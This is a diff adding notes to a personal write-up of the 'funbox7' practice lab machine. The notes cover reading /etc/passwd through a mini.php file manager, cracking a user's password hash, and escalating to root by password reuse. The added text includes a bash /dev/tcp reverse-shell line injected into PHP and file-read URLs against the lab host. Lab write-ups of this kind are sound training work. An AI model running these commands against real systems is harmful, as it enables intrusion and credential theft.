@@ -3,7 +3,7 @@ Date: 03/05/2022
 Difficulty: Easy
 Description: Don't hesitate Enumerate
 Better Description:  
-Goals: 1/many OSCP Boxes to do!
+Goals: 
 Learnt: 
 
 ## Recon
@@ -111,4 +111,56 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 
 ```
+Mini.php allow uploads tried uploading pentest monkey php reverse shell.
+I also is a file system under /var/
 
+![mini](Screenshots/miniphp.png)
+
+While thinking I how and why stuff executes on this box:
+Chmod is weird.
+Replace mini.php with reverse shell or better add a line. It seems like the only thing that can be executed. See ## Foothold
+
+
+
+/var/www/local.txt for first flag
+You can also go to the '/' directory
+
+http://192.168.64.132/mini.php?filesrc=//etc/passwd&path=//etc
+```
+# weird hash
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+```
+http://192.168.64.132/mini.php?filesrc=//etc/hosts&path=//etc
+funbox7 is running on 127.0.1.1
+
+
+
+## Foothold
+
+```php
+
+exec("/bin/bash -c 'bash -i > /dev/tcp/$IP/$PORT 0>&1'");
+
+```
+Went back to the hash it is:
+![hc](Screenshots/hashcat_examples.png)
+hiphop
+
+```bash
+oracle@funbox7:/tmp$ mysql -u oracle -p
+Enter password: 
+ERROR 1045 (28000): Access denied for user 'oracle'@'localhost' (using password: YES)
+```
+Enumerated again and found nothing. I learnt lot about the length of memory for recursive solving.
+I was also possible to see this before as www-data
+
+![rtpma](Screenshots/returntophpmyadmin.png)
+
+Went to the webpage logged in nothing on the database.
+Password reuse? Highest user is Karla
+
+![root](bigk.png)
+```bash
+sudo su root 
+cat /root/proof.txt
+```
